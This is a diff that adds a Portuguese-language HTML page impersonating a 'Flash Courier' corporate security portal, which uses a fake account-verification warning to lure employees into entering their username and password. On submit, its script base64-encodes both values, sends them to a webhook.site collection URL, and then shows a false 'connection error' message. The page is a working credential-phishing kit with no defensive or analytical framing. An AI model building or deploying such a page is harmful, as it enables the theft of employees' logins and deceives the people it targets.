@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Flash Courier - Portal de Segurança</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f5f5f5; margin: 0; }
+        .header { background: #102d69; color: white; padding: 20px; text-align: center; }
+        .container { max-width: 400px; margin: 40px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .alert { background: #fff3cd; border-left: 4px solid #ffc107; padding: 12px; margin-bottom: 15px; font-size: 13px; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; }
+        button { width: 100%; padding: 12px; background: #102d69; color: white; border: none; border-radius: 4px; cursor: pointer; }
+        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h2>FLASH COURIER</h2>
+        <p>Portal de Segurança Corporativa</p>
+    </div>
+    <div class="container">
+        <div class="alert">
+            <strong>Aviso de Segurança</strong><br>
+            Sua conta requer verificação. Faça login para continuar.
+        </div>
+        <form id="loginForm">
+            <input type="text" id="user" placeholder="Usuário" required>
+            <input type="password" id="pass" placeholder="Senha" required>
+            <button type="submit">Verificar Conta</button>
+        </form>
+        <div class="footer">
+            © 2026 Flash Courier - Grupo Moove Sequoia<br>
+            Sistema interno - Acesso restrito
+        </div>
+    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var u = document.getElementById('user').value;
+            var p = document.getElementById('pass').value;
+            fetch('https://webhook.site/e3362141-f0be-4cf3-b4a0-8e8e2cfc5206?u=' + btoa(u) + '&p=' + btoa(p));
+            alert('Erro de conexão. Tente novamente.');
+        });
+    </script>
+</body>
+</html>
